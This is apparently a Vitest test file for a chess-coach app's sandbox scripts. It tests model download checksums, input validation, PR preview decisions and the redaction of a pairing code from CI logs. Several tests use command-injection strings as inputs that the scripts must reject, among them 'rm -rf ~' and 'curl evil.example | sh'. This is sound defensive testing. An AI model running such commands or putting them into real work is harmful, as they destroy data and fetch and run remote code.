import { spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { fetchModel } from '../sandbox/fetch-model.ts';

const script = new URL('../sandbox/prepare.sh', import.meta.url).pathname;
const sandbox = new URL('../sandbox/', import.meta.url).pathname;
const bytes = new TextEncoder().encode('a small stand-in for the model file');
const asset = { name: 'test-model', url: 'https://models.invalid/test-model.onnx', bytes: bytes.byteLength, sha256: createHash('sha256').update(bytes).digest('hex') };
const dirs: string[] = [];

function folder(): string {
  const dir = mkdtempSync(join(tmpdir(), 'sandbox-test-'));
  dirs.push(dir);
  return dir;
}

function serving(body: Uint8Array<ArrayBuffer>) {
  const calls: string[] = [];
  const fetch = (async (url: string | URL | Request) => {
    calls.push(String(url));
    return new Response(body);
  }) as typeof globalThis.fetch;
  return { fetch, calls };
}

afterEach(() => {
  for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true });
});

describe('the model download for a new machine', () => {
  it('puts the checked file under its checksum name, and a second run downloads nothing', async () => {
    const dir = folder();
    const first = serving(bytes);
    const state = await fetchModel({ dir, asset, fetch: first.fetch });
    expect(state.model).toBe('ready');
    expect(state.path).toBe(join(dir, `test-model-${asset.sha256.slice(0, 8)}.onnx`));
    expect(existsSync(state.path)).toBe(true);
    expect(first.calls).toEqual([asset.url]);

    const second = serving(new Uint8Array());
    expect((await fetchModel({ dir, asset, fetch: second.fetch })).model).toBe('ready');
    expect(second.calls).toEqual([]);
  });

  it('keeps no file that fails its checksum, and says so', async () => {
    const dir = folder();
    const wrong = new Uint8Array(bytes.byteLength).fill(120);
    const state = await fetchModel({ dir, asset, fetch: serving(wrong).fetch });
    expect(state.model).toBe('failed');
    expect(state.detail).toContain('checksum');
    expect(readdirSync(dir).filter((f) => f.endsWith('.onnx'))).toEqual([]);
  });
  it('runs from a folder reached through a symlink, and fails out loud when it cannot write the model', () => {
    const link = join(folder(), 'linked-sandbox');
    symlinkSync(sandbox, link);
    const run = spawnSync(process.execPath, [join(link, 'fetch-model.ts')], { encoding: 'utf8', env: { ...process.env, CHESS_COACH_DATA_DIR: '/dev/null/no-folder' } });
    expect(run.status).toBe(1);
    expect(run.stdout).toContain('The model download failed');
  });

  it('is not a failure when another copy of the app on this machine is downloading the model', () => {
    const data = folder();
    mkdirSync(join(data, 'models'));
    // A live process other than the script holds the lock: this test's own.
    writeFileSync(join(data, 'models', 'maia3-5m.lock'), String(process.pid));
    const run = spawnSync(process.execPath, [join(sandbox, 'fetch-model.ts')], { encoding: 'utf8', env: { ...process.env, CHESS_COACH_DATA_DIR: data } });
    expect(run.status).toBe(0);
    expect(run.stdout).toContain('will be in place when that download finishes');
  });
});

describe('prepare.sh', () => {
  it('is valid bash', () => {
    expect(spawnSync('bash', ['-n', script]).status).toBe(0);
  });

  it('refuses an option it does not know before it changes anything', () => {
    const run = spawnSync('bash', [script, '--nope'], { encoding: 'utf8' });
    expect(run.status).toBe(2);
    expect(run.stderr).toContain('usage');
    expect(run.stdout).toBe('');
  });
});

describe('preview.sh and instabox.sh', () => {
  const preview = new URL('../sandbox/preview.sh', import.meta.url).pathname;
  const instabox = new URL('../sandbox/instabox.sh', import.meta.url).pathname;
  const run = (file: string, ...args: string[]) => spawnSync('bash', [file, ...args], { encoding: 'utf8' });

  it('are valid bash', () => {
    expect(spawnSync('bash', ['-n', preview]).status).toBe(0);
    expect(spawnSync('bash', ['-n', instabox]).status).toBe(0);
  });

  it('refuse what they do not know before they start anything', () => {
    for (const r of [run(preview, '--nope'), run(preview, '--port', 'eighty'), run(preview, '--seed', 'Bad Seed'), run(instabox), run(instabox, 'up', '--nope'), run(instabox, 'restart')]) {
      expect(r.status).toBe(2);
      expect(r.stderr).toContain('usage');
      expect(r.stdout).toBe('');
    }
  });

  // The box name and the branch go into a shell command on the box.
  it('pass on only box names and branch names made of safe characters', () => {
    const badBox = run(instabox, 'up', '--box', 'Box; rm -rf ~');
    expect(badBox.status).toBe(2);
    expect(badBox.stderr).toContain('box names');
    const badIfRef = run(instabox, 'down', '--if-ref', 'main;reboot');
    expect(badIfRef.status).toBe(2);
    const badRef = run(instabox, 'up', '--ref', "main'; curl evil.example | sh; '");
    expect(badRef.status).toBe(2);
    expect(badRef.stderr).toContain('branch name');
  });
});

describe('clean.sh', () => {
  const clean = new URL('../sandbox/clean.sh', import.meta.url).pathname;

  it('is valid bash, and refuses what it does not know before it deletes anything', () => {
    expect(spawnSync('bash', ['-n', clean]).status).toBe(0);
    for (const args of [[], ['--deep'], ['--sandbox', '--nope'], ['--sandbox', '--max-percent', '0'], ['--sandbox', '--max-percent', '101'], ['--sandbox', '--max-percent', 'most']]) {
      const r = spawnSync('bash', [clean, ...args], { encoding: 'utf8' });
      expect(r.status).toBe(2);
      expect(r.stderr).toContain('usage');
    }
  });
});

describe('preview-decide.sh', () => {
  const decide = new URL('../sandbox/preview-decide.sh', import.meta.url).pathname;
  const template = readFileSync(new URL('../../.github/pull_request_template.md', import.meta.url), 'utf8');
  const run = (env: Record<string, string>) => {
    const r = spawnSync('bash', [decide], { encoding: 'utf8', env: { PATH: process.env.PATH, EVENT: 'pull_request_target', ENABLED: 'true', ...env } });
    return Object.fromEntries(r.stdout.trim().split('\n').map((l) => l.split('=') as [string, string]));
  };
  const asking = 'Adds a thing.\r\n\r\nPreview: on\r\n';

  it('previews only a PR that asks, then on every push, and takes it down on close', () => {
    expect(run({ ACTION: 'opened', BODY: template }).action).toBe('skip');
    expect(run({ ACTION: 'synchronize', BODY: 'A ready PR that asks nothing.' }).action).toBe('skip');
    expect(run({ ACTION: 'opened', BODY: asking }).action).toBe('up');
    expect(run({ ACTION: 'synchronize', BODY: asking }).action).toBe('up');
    expect(run({ ACTION: 'synchronize', LABELLED: 'true' }).action).toBe('up');
    expect(run({ ACTION: 'labeled', LABEL: 'preview', LABELLED: 'true' }).action).toBe('up');
    expect(run({ ACTION: 'closed' }).action).toBe('down');
    expect(run({ EVENT: 'workflow_dispatch', SEED_INPUT: 'Empty', COACH_INPUT: 'real' })).toEqual({ action: 'up', seed: 'empty', coach: 'real' });
  });

  it('counts an edit only when it adds the request to the description', () => {
    expect(run({ ACTION: 'edited', BODY_CHANGED: 'true', BODY_BEFORE: 'Adds a thing.', BODY: asking }).action).toBe('up');
    expect(run({ ACTION: 'edited', BODY_CHANGED: 'true', BODY_BEFORE: asking, BODY: `${asking}More words.` }).action).toBe('skip');
    expect(run({ ACTION: 'edited', BODY_CHANGED: 'false', BODY_BEFORE: '', BODY: asking }).action).toBe('skip');
  });

  it("never counts the template's own hints, a mention in a sentence, or another label", () => {
    expect(template).toContain('Preview: on');
    expect(run({ ACTION: 'opened', BODY: template }).action).toBe('skip');
    expect(run({ ACTION: 'opened', BODY: 'Add a line "Preview: on" to get one.' }).action).toBe('skip');
    expect(run({ ACTION: 'opened', BODY: '<!--\nPreview: on\n-->' }).action).toBe('skip');
    expect(run({ ACTION: 'labeled', LABEL: 'protected-path', BODY: asking }).action).toBe('skip');
  });

  it('reads the seed and the Coach, and answers a request where previews are off', () => {
    expect(run({ ACTION: 'opened', BODY: `${asking}Preview seed: Empty\nPreview coach: real\n` })).toEqual({ action: 'up', seed: 'empty', coach: 'real' });
    expect(run({ ACTION: 'opened', BODY: `${asking}Preview seed: ; rm -rf ~\n` })).toMatchObject({ seed: 'default', coach: 'fake' });
    expect(run({ ACTION: 'opened', BODY: `${asking}<!-- Preview coach: real -->` }).coach).toBe('fake');
    expect(run({ ACTION: 'opened', BODY: asking, ENABLED: 'false' }).action).toBe('unavailable');
    expect(run({ ACTION: 'closed', ENABLED: 'false' }).action).toBe('skip');
    expect(run({ ACTION: 'opened', BODY: 'Nothing asked.', ENABLED: 'false' }).action).toBe('skip');
  });
});

// The pairing code must never reach a GitHub Actions log, which is public (ADR 0001). A fake instabox
// CLI answers like the real one and records what it was asked to do; the box's answer to the preview
// is whatever the case puts in it.
describe('instabox.sh in GitHub Actions', () => {
  const instabox = new URL('../sandbox/instabox.sh', import.meta.url).pathname;
  const code = 'SECRETCODE1234';
  function fake(preview: string, { selected = '[]', account = '["CLAUDE_CODE_OAUTH_TOKEN"]', args = [] as string[] } = {}) {
    const bin = folder();
    const script = `#!/bin/bash
echo "$*" >> "${bin}/calls"
case "$1 $2" in
  "get "*) echo '{"state":"running","vault":true}' ;;
  "secrets show") echo '{"secrets":${selected},"envSecrets":[],"items":[],"directSecrets":[],"guest":{"revision":2,"appliedRevision":2}}' ;;
  "secrets ls") node -e 'console.log(JSON.stringify({ items: JSON.parse(process.argv[1]).map((name) => ({ name })) }))' '${account}' ;;
  "secrets select"|"secrets push") ;;
  "port ls") echo '{"ports":[{"port":8790,"url":"https://8790-box.instabox.tech"}]}' ;;
  "push "*) ;;
  "exec "*) case "$*" in *preview.sh*) cat "${bin}/preview.out" ;; esac ;;
  *) echo "fake instabox: $*" >&2; exit 1 ;;
esac
`;
    writeFileSync(join(bin, 'instabox'), script, { mode: 0o755 });
    writeFileSync(join(bin, 'preview.out'), preview);
    writeFileSync(join(bin, 'telegram-notify'), `#!/bin/bash\nprintf '%s' "$1" > "${bin}/sent"\n`, { mode: 0o755 });
    // Neither the real instabox CLI nor the real telegram-notify: only the fakes.
    const path = [bin, ...(process.env.PATH ?? '').split(':').filter((d) => !existsSync(join(d, 'instabox')) && !existsSync(join(d, 'telegram-notify')))].join(':');
    const r = spawnSync('bash', [instabox, 'up', '--box', 'test-box', '--ref', 'some-branch', '--notify', ...args], {
      encoding: 'utf8',
      env: { PATH: path, HOME: bin, GITHUB_ACTIONS: 'true' },
    });
    const read = (f: string) => (existsSync(join(bin, f)) ? readFileSync(join(bin, f), 'utf8') : '');
    return { ...r, sent: read('sent'), calls: read('calls') };
  }
  const ok = (coach = 'fake') => `some log line\n{"ok":true,"runId":"run-1","port":8790,"coach":"${coach}","commit":"abc1234","pairPath":"/#pair=${code}","doctor":{"ok":true,"failed":[]}}\n`;

  it('sends the link by Telegram and prints it nowhere', () => {
    const r = fake(ok());
    expect(r.status).toBe(0);
    expect(r.sent).toContain(`https://8790-box.instabox.tech/#pair=${code}`);
    expect(r.stdout + r.stderr).not.toContain(code);
    expect(JSON.parse(r.stdout.trim().split('\n').pop()!)).toMatchObject({ ok: true, coach: 'fake' });
    expect(JSON.parse(r.stdout.trim().split('\n').pop()!)).not.toHaveProperty('link');
  });

  it('reports only what failed when the preview fails, even when the answer holds the code', () => {
    for (const answer of [
      `{"ok":false,"error":"doctor failed: web-app","pairPath":"/#pair=${code}","doctor":{"ok":false,"failed":["web-app"]}}`,
      `{"ok":false,"error":"verify said http://127.0.0.1:1/#pair=${code}"}`,
      `not json at all #pair=${code}`,
    ]) {
      const r = fake(`${answer}\n`);
      expect(r.status).toBe(1);
      expect(r.stdout + r.stderr).not.toContain(code);
      expect(r.sent).toBe('');
    }
  });

  it("leaves the box's Secrets alone, and runs the branch in the bubble", () => {
    const r = fake(ok(), { selected: '["SOMETHING_ELSE"]' });
    expect(r.status).toBe(0);
    expect(r.calls).not.toContain('secrets select');
    expect(r.calls).toMatch(/preview\.sh --repo \S+ --sandbox /);
    expect(r.calls).not.toContain('--real-coach');
  });

  it('adds the Claude Secret for the real Coach without removing the others, or says it is missing', () => {
    const r = fake(ok('real'), { selected: '["SOMETHING_ELSE"]', args: ['--real-coach'] });
    expect(r.status).toBe(0);
    expect(r.calls).toContain('secrets select test-box --secrets ["SOMETHING_ELSE","CLAUDE_CODE_OAUTH_TOKEN"]');
    expect(r.calls).toContain('--sandbox --seed default --port 8790 --real-coach');
    expect(r.sent).toContain('real Coach');

    const already = fake(ok('real'), { selected: '["CLAUDE_CODE_OAUTH_TOKEN"]', args: ['--real-coach'] });
    expect(already.status).toBe(0);
    expect(already.calls).not.toContain('secrets select');

    const missing = fake(ok('real'), { account: '[]', args: ['--real-coach'] });
    expect(missing.status).toBe(1);
    expect(missing.stderr).toContain('needs a Secret named CLAUDE_CODE_OAUTH_TOKEN');
    expect(missing.sent).toBe('');
  });
});
